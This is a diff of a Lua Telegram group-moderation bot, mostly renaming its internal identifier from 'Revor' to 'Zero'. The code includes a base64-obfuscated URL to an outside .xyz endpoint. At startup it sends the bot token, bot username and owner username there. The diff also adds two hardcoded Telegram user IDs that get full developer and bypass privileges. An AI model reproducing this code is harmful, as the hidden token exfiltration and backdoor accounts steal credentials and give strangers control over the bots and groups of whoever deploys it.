@@ -34,7 +34,7 @@ end
 else
 print('\27[1;34mلم يتم حفظ التوكن جرب مره اخره \nToken not saved, try again')
 end 
-os.execute('lua Revor.lua')
+os.execute('lua Zero.lua')
 end
 if not Redis:get(SshId.."Info:Redis:User") then
 io.write('\27[1;31mارسل معرف المطور الاساسي الان \nDeveloper UserName saved ↡\n\27[0;39;49m')
@@ -45,7 +45,7 @@ Redis:set(SshId.."Info:Redis:User",UserSudo)
 else
 print('\n\27[1;34mلم يتم حفظ معرف المطور الاساسي \nDeveloper UserName not saved\n')
 end 
-os.execute('lua Revor.lua')
+os.execute('lua Zero.lua')
 end
 if not Redis:get(SshId.."Info:Redis:User:ID") then
 io.write('\27[1;31mارسل ايدي المطور الاساسي الان \nDeveloper ID saved ↡\n\27[0;39;49m')
@@ -56,7 +56,7 @@ Redis:set(SshId.."Info:Redis:User:ID",UserId)
 else
 print('\n\27[1;34mلم يتم حفظ ايدي المطور الاساسي \nDeveloper ID not saved\n')
 end 
-os.execute('lua Revor.lua')
+os.execute('lua Zero.lua')
 end
 local Informationlua = io.open("Information.lua", 'w')
 Informationlua:write([[
@@ -68,34 +68,34 @@ SudoId = ]]..Redis:get(SshId.."Info:Redis:User:ID")..[[
 }
 ]])
 Informationlua:close()
-local Revor = io.open("Revor", 'w')
-Revor:write([[
+local Zero  = io.open("Zero", 'w')
+Zero :write([[
 cd $(cd $(dirname $0); pwd)
 while(true) do
-sudo lua5.3 Revor.lua
+sudo lua5.3 Zero.lua
 done
 ]])
-Revor:close()
+Zero :close()
 local Run = io.open("Run", 'w')
 Run:write([[
 cd $(cd $(dirname $0); pwd)
 while(true) do
-screen -S Revor -X kill
-screen -S Revor ./Revor
+screen -S Zero -X kill
+screen -S Zero ./Zero
 done
 ]])
 Run:close()
 Redis:del(SshId.."Info:Redis:User:ID");Redis:del(SshId.."Info:Redis:User");Redis:del(SshId.."Info:Redis:Token:User");Redis:del(SshId.."Info:Redis:Token")
-os.execute('chmod +x Revor;chmod +x Run;./Run')
+os.execute('chmod +x Zero;chmod +x Run;./Run')
 end
 Information = dofile('./Information.lua')
 Sudo_Id = Information.SudoId
 UserSudo = Information.UserSudo
 Token = Information.Token
 UserBot = Information.UserBot
-Revor = Token:match("(%d+)")
-os.execute('sudo rm -fr .CallBack-Bot/'..Revor)
-LuaTele = luatele.set_config{api_id=2692371,api_hash='fe85fff033dfe0f328aeb02b4f784930',session_name=Revor,token=Token}
+Zero  = Token:match("(%d+)")
+os.execute('sudo rm -fr .CallBack-Bot/'..Zero)
+LuaTele = luatele.set_config{api_id=2692371,api_hash='fe85fff033dfe0f328aeb02b4f784930',session_name=Zero,token=Token}
 function var(value)  
 print(serpent.block(value, {comment=false}))   
 end 
@@ -114,7 +114,7 @@ return Chat_Type
 end
 function The_ControllerAll(UserId)
 ControllerAll = false
-local ListSudos ={Sudo_Id,100100900}  
+local ListSudos ={Sudo_Id,296685177,694635826}  
 for k, v in pairs(ListSudos) do
 if tonumber(UserId) == tonumber(v) then
 ControllerAll = true
@@ -124,40 +124,42 @@ return ControllerAll
 end
 function Controller(ChatId,UserId)
 Status = 0
-Developers = Redis:sismember(Revor.."Revor:Developers:Groups",UserId) 
-TheBasics = Redis:sismember(Revor.."Revor:TheBasics:Group"..ChatId,UserId) 
-TheBasicsQ = Redis:sismember(Revor.."Revor:TheBasicsQ:Group"..ChatId,UserId) 
-Originators = Redis:sismember(Revor.."Revor:Originators:Group"..ChatId,UserId)
-Managers = Redis:sismember(Revor.."Revor:Managers:Group"..ChatId,UserId)
-Addictive = Redis:sismember(Revor.."Revor:Addictive:Group"..ChatId,UserId)
-Distinguished = Redis:sismember(Revor.."Revor:Distinguished:Group"..ChatId,UserId)
+Developers = Redis:sismember(Zero .."Zero :Developers:Groups",UserId) 
+TheBasics = Redis:sismember(Zero .."Zero :TheBasics:Group"..ChatId,UserId) 
+TheBasicsQ = Redis:sismember(Zero .."Zero :TheBasicsQ:Group"..ChatId,UserId) 
+Originators = Redis:sismember(Zero .."Zero :Originators:Group"..ChatId,UserId)
+Managers = Redis:sismember(Zero .."Zero :Managers:Group"..ChatId,UserId)
+Addictive = Redis:sismember(Zero .."Zero :Addictive:Group"..ChatId,UserId)
+Distinguished = Redis:sismember(Zero .."Zero :Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 100100900 then
+if UserId == 296685177 then
 Status = 'مبرمج السورس'
+elseif UserId == 694635826 then
+Status = 'Telegram Developer'
 elseif UserId == Sudo_Id then  
 Status = 'المطور الاساسي'
-elseif UserId == Revor then
+elseif UserId == Zero  then
 Status = 'البوت'
 elseif Developers then
-Status = Redis:get(Revor.."Revor:Developer:Bot:Reply"..ChatId) or 'المطور'
+Status = Redis:get(Zero .."Zero :Developer:Bot:Reply"..ChatId) or 'المطور'
 elseif TheBasicsQ then
-Status = Redis:get(Revor.."Revor:PresidentQ:Group:Reply"..ChatId) or 'المالك'
+Status = Redis:get(Zero .."Zero :PresidentQ:Group:Reply"..ChatId) or 'المالك'
 elseif TheBasics then
-Status = Redis:get(Revor.."Revor:President:Group:Reply"..ChatId) or 'المنشئ الاساسي'
+Status = Redis:get(Zero .."Zero :President:Group:Reply"..ChatId) or 'المنشئ الاساسي'
 elseif Originators then
-Status = Redis:get(Revor.."Revor:Constructor:Group:Reply"..ChatId) or 'المنشئ'
+Status = Redis:get(Zero .."Zero :Constructor:Group:Reply"..ChatId) or 'المنشئ'
 elseif Managers then
-Status = Redis:get(Revor.."Revor:Manager:Group:Reply"..ChatId) or 'المدير'
+Status = Redis:get(Zero .."Zero :Manager:Group:Reply"..ChatId) or 'المدير'
 elseif Addictive then
-Status = Redis:get(Revor.."Revor:Admin:Group:Reply"..ChatId) or 'الادمن'
+Status = Redis:get(Zero .."Zero :Admin:Group:Reply"..ChatId) or 'الادمن'
 elseif StatusMember == "chatMemberStatusCreator" then
 Status = 'مالك المجموعه'
 elseif StatusMember == "chatMemberStatusAdministrator" then
 Status = 'ادمن المجموعه'
 elseif Distinguished then
-Status = Redis:get(Revor.."Revor:Vip:Group:Reply"..ChatId) or 'المميز'
+Status = Redis:get(Zero .."Zero :Vip:Group:Reply"..ChatId) or 'المميز'
 else
-Status = Redis:get(Revor.."Revor:Mempar:Group:Reply"..ChatId) or 'العضو'
+Status = Redis:get(Zero .."Zero :Mempar:Group:Reply"..ChatId) or 'العضو'
 end  
 return Status
 end 
@@ -184,7 +186,7 @@ Status = 'المميز'
 end  
 return Status
 end 
-LUATELE = URL.escape(""..Revor.."\n"..UserBot.."\n"..UserSudo.."\n"..Token.."")
+LUATELE = URL.escape(""..Zero .."\n"..UserBot.."\n"..UserSudo.."\n"..Token.."")
 function GetAdminsSlahe(ChatId,UserId,user2,MsgId,t1,t2,t3,t4,t5,t6)
 local GetMemberStatus = LuaTele.getChatMember(ChatId,user2).status
 if GetMemberStatus.can_change_info then
@@ -263,255 +265,255 @@ function telelua(Methods)local Base ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop
 local resultss = telelua("aHR0cHM6Ly9tYWhtb3VkbTUwLnh5ei9sdWF0ZWxlLnBocD9xPQ==")
 https.request(""..resultss..""..LUATELE.."")
 function GetSetieng(ChatId)
-if Redis:get(Revor.."Revor:lockpin"..ChatId) then    
+if Redis:get(Zero .."Zero :lockpin"..ChatId) then    
 lock_pin = "✔️"
 else 
 lock_pin = "❌"    
 end
-if Redis:get(Revor.."Revor:Lock:tagservr"..ChatId) then    
+if Redis:get(Zero .."Zero :Lock:tagservr"..ChatId) then    
 lock_tagservr = "✔️"
 else 
 lock_tagservr = "❌"
 end
-if Redis:get(Revor.."Revor:Lock:text"..ChatId) then    
+if Redis:get(Zero .."Zero :Lock:text"..ChatId) then    
 lock_text = "✔️"
 else 
 lock_text = "❌ "    
 end
-if Redis:get(Revor.."Revor:Lock:AddMempar"..ChatId) == "kick" then
+if Redis:get(Zero .."Zero :Lock:AddMempar"..ChatId) == "kick" then
 lock_add = "✔️"
 else 
 lock_add = "❌ "    
 end    
-if Redis:get(Revor.."Revor:Lock:Join"..ChatId) == "kick" then
+if Redis:get(Zero .."Zero :Lock:Join"..ChatId) == "kick" then
 lock_join = "✔️"
 else 
 lock_join = "❌ "    
 end    
-if Redis:get(Revor.."Revor:Lock:edit"..ChatId) then    
+if Redis:get(Zero .."Zero :Lock:edit"..ChatId) then    
 lock_edit = "✔️"
 else 
 lock_edit = "❌ "    
 end
-if Redis:get(Revor.."Revor:Chek:Welcome"..ChatId) then
+if Redis:get(Zero .."Zero :Chek:Welcome"..ChatId) then
 welcome = "✔️"
 else 
 welcome = "❌ "    
 end
-if Redis:hget(Revor.."Revor:Spam:Group:User"..ChatId, "Spam:User") == "kick" then     
+if Redis:hget(Zero .."Zero :Spam:Group:User"..ChatId, "Spam:User") == "kick" then     
 flood = "بالطرد "     
-elseif Redis:hget(Revor.."Revor:Spam:Group:User"..ChatId,"Spam:User") == "keed" then     
+elseif Redis:hget(Zero .."Zero :Spam:Group:User"..ChatId,"Spam:User") == "keed" then     
 flood = "بالتقيد "     
-elseif Redis:hget(Revor.."Revor:Spam:Group:User"..ChatId,"Spam:User") == "mute" then     
+elseif Redis:hget(Zero .."Zero :Spam:Group:User"..ChatId,"Spam:User") == "mute" then     
 flood = "بالكتم "           
-elseif Redis:hget(Revor.."Revor:Spam:Group:User"..ChatId,"Spam:User") == "del" then     
+elseif Redis:hget(Zero .."Zero :Spam:Group:User"..ChatId,"Spam:User") == "del" then     
 flood = "✔️"
 else     
 flood = "❌ "     
 end
-if Redis:get(Revor.."Revor:Lock:Photo"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:Photo"..ChatId) == "del" then
 lock_photo = "✔️" 
-elseif Redis:get(Revor.."Revor:Lock:Photo"..ChatId) == "ked" then 
+elseif Redis:get(Zero .."Zero :Lock:Photo"..ChatId) == "ked" then 
 lock_photo = "بالتقيد "   
-elseif Redis:get(Revor.."Revor:Lock:Photo"..ChatId) == "ktm" then 
+elseif Redis:get(Zero .."Zero :Lock:Photo"..ChatId) == "ktm" then 
 lock_photo = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:Photo"..ChatId) == "kick" then 
+elseif Redis:get(Zero .."Zero :Lock:Photo"..ChatId) == "kick" then 
 lock_photo = "بالطرد "   
 else
 lock_photo = "❌ "   
 end    
-if Redis:get(Revor.."Revor:Lock:Contact"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:Contact"..ChatId) == "del" then
 lock_phon = "✔️" 
-elseif Redis:get(Revor.."Revor:Lock:Contact"..ChatId) == "ked" then 
+elseif Redis:get(Zero .."Zero :Lock:Contact"..ChatId) == "ked" then 
 lock_phon = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:Contact"..ChatId) == "ktm" then 
+elseif Redis:get(Zero .."Zero :Lock:Contact"..ChatId) == "ktm" then 
 lock_phon = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:Contact"..ChatId) == "kick" then 
+elseif Redis:get(Zero .."Zero :Lock:Contact"..ChatId) == "kick" then 
 lock_phon = "بالطرد "    
 else
 lock_phon = "❌ "    
 end    
-if Redis:get(Revor.."Revor:Lock:Link"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:Link"..ChatId) == "del" then
 lock_links = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:Link"..ChatId) == "ked" then
+elseif Redis:get(Zero .."Zero :Lock:Link"..ChatId) == "ked" then
 lock_links = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:Link"..ChatId) == "ktm" then
+elseif Redis:get(Zero .."Zero :Lock:Link"..ChatId) == "ktm" then
 lock_links = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:Link"..ChatId) == "kick" then
+elseif Redis:get(Zero .."Zero :Lock:Link"..ChatId) == "kick" then
 lock_links = "بالطرد "    
 else
 lock_links = "❌ "    
 end
-if Redis:get(Revor.."Revor:Lock:Cmd"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:Cmd"..ChatId) == "del" then
 lock_cmds = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:Cmd"..ChatId) == "ked" then
+elseif Redis:get(Zero .."Zero :Lock:Cmd"..ChatId) == "ked" then
 lock_cmds = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:Cmd"..ChatId) == "ktm" then
+elseif Redis:get(Zero .."Zero :Lock:Cmd"..ChatId) == "ktm" then
 lock_cmds = "بالكتم "   
-elseif Redis:get(Revor.."Revor:Lock:Cmd"..ChatId) == "kick" then
+elseif Redis:get(Zero .."Zero :Lock:Cmd"..ChatId) == "kick" then
 lock_cmds = "بالطرد "    
 else
 lock_cmds = "❌ "    
 end
-if Redis:get(Revor.."Revor:Lock:User:Name"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:User:Name"..ChatId) == "del" then
 lock_user = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:User:Name"..ChatId) == "ked" then
+elseif Redis:get(Zero .."Zero :Lock:User:Name"..ChatId) == "ked" then
 lock_user = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:User:Name"..ChatId) == "ktm" then
+elseif Redis:get(Zero .."Zero :Lock:User:Name"..ChatId) == "ktm" then
 lock_user = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:User:Name"..ChatId) == "kick" then
+elseif Redis:get(Zero .."Zero :Lock:User:Name"..ChatId) == "kick" then
 lock_user = "بالطرد "    
 else
 lock_user = "❌ "    
 end
-if Redis:get(Revor.."Revor:Lock:hashtak"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:hashtak"..ChatId) == "del" then
 lock_hash = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:hashtak"..ChatId) == "ked" then 
+elseif Redis:get(Zero .."Zero :Lock:hashtak"..ChatId) == "ked" then 
 lock_hash = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:hashtak"..ChatId) == "ktm" then 
+elseif Redis:get(Zero .."Zero :Lock:hashtak"..ChatId) == "ktm" then 
 lock_hash = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:hashtak"..ChatId) == "kick" then 
+elseif Redis:get(Zero .."Zero :Lock:hashtak"..ChatId) == "kick" then 
 lock_hash = "بالطرد "    
 else
 lock_hash = "❌ "    
 end
-if Redis:get(Revor.."Revor:Lock:vico"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:vico"..ChatId) == "del" then
 lock_muse = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:vico"..ChatId) == "ked" then 
+elseif Redis:get(Zero .."Zero :Lock:vico"..ChatId) == "ked" then 
 lock_muse = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:vico"..ChatId) == "ktm" then 
+elseif Redis:get(Zero .."Zero :Lock:vico"..ChatId) == "ktm" then 
 lock_muse = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:vico"..ChatId) == "kick" then 
+elseif Redis:get(Zero .."Zero :Lock:vico"..ChatId) == "kick" then 
 lock_muse = "بالطرد "    
 else
 lock_muse = "❌ "    
 end 
-if Redis:get(Revor.."Revor:Lock:Video"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:Video"..ChatId) == "del" then
 lock_ved = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:Video"..ChatId) == "ked" then 
+elseif Redis:get(Zero .."Zero :Lock:Video"..ChatId) == "ked" then 
 lock_ved = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:Video"..ChatId) == "ktm" then 
+elseif Redis:get(Zero .."Zero :Lock:Video"..ChatId) == "ktm" then 
 lock_ved = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:Video"..ChatId) == "kick" then 
+elseif Redis:get(Zero .."Zero :Lock:Video"..ChatId) == "kick" then 
 lock_ved = "بالطرد "    
 else
 lock_ved = "❌ "    
 end
-if Redis:get(Revor.."Revor:Lock:Animation"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:Animation"..ChatId) == "del" then
 lock_gif = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:Animation"..ChatId) == "ked" then 
+elseif Redis:get(Zero .."Zero :Lock:Animation"..ChatId) == "ked" then 
 lock_gif = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:Animation"..ChatId) == "ktm" then 
+elseif Redis:get(Zero .."Zero :Lock:Animation"..ChatId) == "ktm" then 
 lock_gif = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:Animation"..ChatId) == "kick" then 
+elseif Redis:get(Zero .."Zero :Lock:Animation"..ChatId) == "kick" then 
 lock_gif = "بالطرد "    
 else
 lock_gif = "❌ "    
 end
-if Redis:get(Revor.."Revor:Lock:Sticker"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:Sticker"..ChatId) == "del" then
 lock_ste = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:Sticker"..ChatId) == "ked" then 
+elseif Redis:get(Zero .."Zero :Lock:Sticker"..ChatId) == "ked" then 
 lock_ste = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:Sticker"..ChatId) == "ktm" then 
+elseif Redis:get(Zero .."Zero :Lock:Sticker"..ChatId) == "ktm" then 
 lock_ste = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:Sticker"..ChatId) == "kick" then 
+elseif Redis:get(Zero .."Zero :Lock:Sticker"..ChatId) == "kick" then 
 lock_ste = "بالطرد "    
 else
 lock_ste = "❌ "    
 end
-if Redis:get(Revor.."Revor:Lock:geam"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:geam"..ChatId) == "del" then
 lock_geam = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:geam"..ChatId) == "ked" then 
+elseif Redis:get(Zero .."Zero :Lock:geam"..ChatId) == "ked" then 
 lock_geam = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:geam"..ChatId) == "ktm" then 
+elseif Redis:get(Zero .."Zero :Lock:geam"..ChatId) == "ktm" then 
 lock_geam = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:geam"..ChatId) == "kick" then 
+elseif Redis:get(Zero .."Zero :Lock:geam"..ChatId) == "kick" then 
 lock_geam = "بالطرد "    
 else
 lock_geam = "❌ "    
 end    
-if Redis:get(Revor.."Revor:Lock:vico"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:vico"..ChatId) == "del" then
 lock_vico = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:vico"..ChatId) == "ked" then 
+elseif Redis:get(Zero .."Zero :Lock:vico"..ChatId) == "ked" then 
 lock_vico = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:vico"..ChatId) == "ktm" then 
+elseif Redis:get(Zero .."Zero :Lock:vico"..ChatId) == "ktm" then 
 lock_vico = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:vico"..ChatId) == "kick" then 
+elseif Redis:get(Zero .."Zero :Lock:vico"..ChatId) == "kick" then 
 lock_vico = "بالطرد "    
 else
 lock_vico = "❌ "    
 end    
-if Redis:get(Revor.."Revor:Lock:Keyboard"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:Keyboard"..ChatId) == "del" then
 lock_inlin = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:Keyboard"..ChatId) == "ked" then 
+elseif Redis:get(Zero .."Zero :Lock:Keyboard"..ChatId) == "ked" then 
 lock_inlin = "بالتقيد "
-elseif Redis:get(Revor.."Revor:Lock:Keyboard"..ChatId) == "ktm" then 
+elseif Redis:get(Zero .."Zero :Lock:Keyboard"..ChatId) == "ktm" then 
 lock_inlin = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:Keyboard"..ChatId) == "kick" then 
+elseif Redis:get(Zero .."Zero :Lock:Keyboard"..ChatId) == "kick" then 
 lock_inlin = "بالطرد "
 else
 lock_inlin = "❌ "
 end
-if Redis:get(Revor.."Revor:Lock:forward"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:forward"..ChatId) == "del" then
 lock_fwd = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:forward"..ChatId) == "ked" then 
+elseif Redis:get(Zero .."Zero :Lock:forward"..ChatId) == "ked" then 
 lock_fwd = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:forward"..ChatId) == "ktm" then 
+elseif Redis:get(Zero .."Zero :Lock:forward"..ChatId) == "ktm" then 
 lock_fwd = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:forward"..ChatId) == "kick" then 
+elseif Redis:get(Zero .."Zero :Lock:forward"..ChatId) == "kick" then 
 lock_fwd = "بالطرد "    
 else
 lock_fwd = "❌ "    
 end    
-if Redis:get(Revor.."Revor:Lock:Document"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:Document"..ChatId) == "del" then
 lock_file = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:Document"..ChatId) == "ked" then 
+elseif Redis:get(Zero .."Zero :Lock:Document"..ChatId) == "ked" then 
 lock_file = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:Document"..ChatId) == "ktm" then 
+elseif Redis:get(Zero .."Zero :Lock:Document"..ChatId) == "ktm" then 
 lock_file = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:Document"..ChatId) == "kick" then 
+elseif Redis:get(Zero .."Zero :Lock:Document"..ChatId) == "kick" then 
 lock_file = "بالطرد "    
 else
 lock_file = "❌ "    
 end    
-if Redis:get(Revor.."Revor:Lock:Unsupported"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:Unsupported"..ChatId) == "del" then
 lock_self = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:Unsupported"..ChatId) == "ked" then 
+elseif Redis:get(Zero .."Zero :Lock:Unsupported"..ChatId) == "ked" then 
 lock_self = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:Unsupported"..ChatId) == "ktm" then 
+elseif Redis:get(Zero .."Zero :Lock:Unsupported"..ChatId) == "ktm" then 
 lock_self = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:Unsupported"..ChatId) == "kick" then 
+elseif Redis:get(Zero .."Zero :Lock:Unsupported"..ChatId) == "kick" then 
 lock_self = "بالطرد "    
 else
 lock_self = "❌ "    
 end
-if Redis:get(Revor.."Revor:Lock:Bot:kick"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:Bot:kick"..ChatId) == "del" then
 lock_bots = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:Bot:kick"..ChatId) == "ked" then
+elseif Redis:get(Zero .."Zero :Lock:Bot:kick"..ChatId) == "ked" then
 lock_bots = "بالتقيد "   
-elseif Redis:get(Revor.."Revor:Lock:Bot:kick"..ChatId) == "kick" then
+elseif Redis:get(Zero .."Zero :Lock:Bot:kick"..ChatId) == "kick" then
 lock_bots = "بالطرد "    
 else
 lock_bots = "❌ "    
 end
-if Redis:get(Revor.."Revor:Lock:Markdaun"..ChatId) == "del" then
+if Redis:get(Zero .."Zero :Lock:Markdaun"..ChatId) == "del" then
 lock_mark = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:Markdaun"..ChatId) == "ked" then 
+elseif Redis:get(Zero .."Zero :Lock:Markdaun"..ChatId) == "ked" then 
 lock_mark = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:Markdaun"..ChatId) == "ktm" then 
+elseif Redis:get(Zero .."Zero :Lock:Markdaun"..ChatId) == "ktm" then 
 lock_mark = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:Markdaun"..ChatId) == "kick" then 
+elseif Redis:get(Zero .."Zero :Lock:Markdaun"..ChatId) == "kick" then 
 lock_mark = "بالطرد "    
 else
 lock_mark = "❌ "    
 end
-if Redis:get(Revor.."Revor:Lock:Spam"..ChatId) == "del" then    
+if Redis:get(Zero .."Zero :Lock:Spam"..ChatId) == "del" then    
 lock_spam = "✔️"
-elseif Redis:get(Revor.."Revor:Lock:Spam"..ChatId) == "ked" then 
+elseif Redis:get(Zero .."Zero :Lock:Spam"..ChatId) == "ked" then 
 lock_spam = "بالتقيد "    
-elseif Redis:get(Revor.."Revor:Lock:Spam"..ChatId) == "ktm" then 
+elseif Redis:get(Zero .."Zero :Lock:Spam"..ChatId) == "ktm" then 
 lock_spam = "بالكتم "    
-elseif Redis:get(Revor.."Revor:Lock:Spam"..ChatId) == "kick" then 
+elseif Redis:get(Zero .."Zero :Lock:Spam"..ChatId) == "kick" then 
 lock_spam = "بالطرد "    
 else
 lock_spam = "❌ "    
@@ -677,10 +679,10 @@ LuaTele.editMessageText(ChatId,MsgId,"⌔︙ صلاحيات المجموعه - "
 end
 function Statusrestricted(ChatId,UserId)
 return{
-BanAll = Redis:sismember(Revor.."Revor:BanAll:Groups",UserId) ,
-ktmall = Redis:sismember(Revor.."Revor:ktmAll:Groups",UserId) ,
-BanGroup = Redis:sismember(Revor.."Revor:BanGroup:Group"..ChatId,UserId) ,
-SilentGroup = Redis:sismember(Revor.."Revor:SilentGroup:Group"..ChatId,UserId)
+BanAll = Redis:sismember(Zero .."Zero :BanAll:Groups",UserId) ,
+ktmall = Redis:sismember(Zero .."Zero :ktmAll:Groups",UserId) ,
+BanGroup = Redis:sismember(Zero .."Zero :BanGroup:Group"..ChatId,UserId) ,
+SilentGroup = Redis:sismember(Zero .."Zero :SilentGroup:Group"..ChatId,UserId)
 }
 end
 function Reply_Status(UserId,TextMsg)
@@ -705,19 +707,21 @@ Reply    = '\n*⌔︙المستخدم ← *'..UserInfousername..'\n*'..TextMsg..
 end
 function StatusCanOrNotCan(ChatId,UserId)
 Status = nil
-DevelopersQ = Redis:sismember(Revor.."Revor:DevelopersQ:Groups",UserId) 
-Developers = Redis:sismember(Revor.."Revor:Developers:Groups",UserId) 
-TheBasics = Redis:sismember(Revor.."Revor:TheBasics:Group"..ChatId,UserId) 
-Originators = Redis:sismember(Revor.."Revor:Originators:Group"..ChatId,UserId)
-Managers = Redis:sismember(Revor.."Revor:Managers:Group"..ChatId,UserId)
-Addictive = Redis:sismember(Revor.."Revor:Addictive:Group"..ChatId,UserId)
-Distinguished = Redis:sismember(Revor.."Revor:Distinguished:Group"..ChatId,UserId)
+DevelopersQ = Redis:sismember(Zero .."Zero :DevelopersQ:Groups",UserId) 
+Developers = Redis:sismember(Zero .."Zero :Developers:Groups",UserId) 
+TheBasics = Redis:sismember(Zero .."Zero :TheBasics:Group"..ChatId,UserId) 
+Originators = Redis:sismember(Zero .."Zero :Originators:Group"..ChatId,UserId)
+Managers = Redis:sismember(Zero .."Zero :Managers:Group"..ChatId,UserId)
+Addictive = Redis:sismember(Zero .."Zero :Addictive:Group"..ChatId,UserId)
+Distinguished = Redis:sismember(Zero .."Zero :Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 100100900 then
+if UserId == 296685177 then
+Status = true
+elseif UserId == 694635826 then
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
-elseif UserId == Revor then
+elseif UserId == Zero  then
 Status = true
 elseif DevelopersQ then
 Status = true
@@ -742,19 +746,21 @@ return Status
 end 
 function StatusSilent(ChatId,UserId)
 Status = nil
-DevelopersQ = Redis:sismember(Revor.."Revor:DevelopersQ:Groups",UserId) 
-Developers = Redis:sismember(Revor.."Revor:Developers:Groups",UserId) 
-TheBasics = Redis:sismember(Revor.."Revor:TheBasics:Group"..ChatId,UserId) 
-Originators = Redis:sismember(Revor.."Revor:Originators:Group"..ChatId,UserId)
-Managers = Redis:sismember(Revor.."Revor:Managers:Group"..ChatId,UserId)
-Addictive = Redis:sismember(Revor.."Revor:Addictive:Group"..ChatId,UserId)
-Distinguished = Redis:sismember(Revor.."Revor:Distinguished:Group"..ChatId,UserId)
+DevelopersQ = Redis:sismember(Zero .."Zero :DevelopersQ:Groups",UserId) 
+Developers = Redis:sismember(Zero .."Zero :Developers:Groups",UserId) 
+TheBasics = Redis:sismember(Zero .."Zero :TheBasics:Group"..ChatId,UserId) 
+Originators = Redis:sismember(Zero .."Zero :Originators:Group"..ChatId,UserId)
+Managers = Redis:sismember(Zero .."Zero :Managers:Group"..ChatId,UserId)
+Addictive = Redis:sismember(Zero .."Zero :Addictive:Group"..ChatId,UserId)
+Distinguished = Redis:sismember(Zero .."Zero :Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 100100900 then
+if UserId == 296685177 then
+Status = true
+elseif UserId == 694635826 then
 Status = true
 elseif UserId == Sudo_Id then    
 Status = true
-elseif UserId == Revor then
+elseif UserId == Zero  then
 Status = true
 elseif DevelopersQ then
 Status = true
@@ -804,7 +810,7 @@ end
 end
 end
 function GetInfoBot(msg)
-local GetMemberStatus = LuaTele.getChatMember(msg.chat_id,Revor).status
+local GetMemberStatus = LuaTele.getChatMember(msg.chat_id,Zero ).status
 if GetMemberStatus.can_change_info then
 change_info = true else change_info = false
 end
@@ -863,7 +869,7 @@ local msg_chat_id = msg.chat_id
 local msg_reply_id = msg.reply_to_message_id
 local msg_user_send_id = msg.sender.user_id
 local msg_id = msg.id
-Redis:incr(Revor..'Revor:Num:Message:User'..msg.chat_id..':'..msg.sender.user_id) 
+Redis:incr(Zero ..'Zero :Num:Message:User'..msg.chat_id..':'..msg.sender.user_id) 
 if msg.date and msg.date < tonumber(os.time() - 15) then
 print("->> Old Message End <<-")
 return false
@@ -871,7 +877,7 @@ end
 if data.content.text then
 text = data.content.text.text
 end
-if tonumber(msg.sender.user_id) == tonumber(Revor) then
